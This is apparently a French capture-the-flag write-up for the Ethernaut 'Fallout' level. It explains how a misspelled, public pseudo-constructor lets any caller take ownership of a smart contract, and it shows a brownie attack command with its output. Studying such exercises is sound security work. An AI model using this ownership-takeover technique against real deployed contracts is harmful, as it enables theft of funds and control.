# Fallout

## Objectif
L'objectif de ce challenge est de devenir le owner du contrat.


## Devenir owner
A la lecture du contrat, la seule possibilité de devenir `owner` est à la [ligne 13](contracts/fallout.sol#L13)

Contrairement à d'autres langages orienté objet, le constructeur d'un contrat est une méthode utilisant le mot clé `constructor`.
Pour éviter des erreurs, le langage ne permet qu'une méthode ait le même nom que le contrat.

Ici le code soure compile car la fonction est nommée `Fal1out` et non `Fallout`.

La méthode `Fal1out` est `public`, il est donc possible de l'appeller pour devenir `owner` du contrat.


## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run attack main "0x2fbc9Eb61E4077309a6D90eb33ec96115b91E873" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

FalloutProject is the active project.

Running 'scripts/attack.py::main'...
Owner is hacker: False
Transaction sent: 0xbcf611eb96d41cc73b0ac010f362b67579ea5c2ff9fd440f205f6c4570a852b1
  Gas price: 1.00000001 gwei   Gas limit: 50442   Nonce: 199
  Transaction confirmed   Block: 10190759   Gas used: 45767 (90.73%)

Owner is hacker: True
```





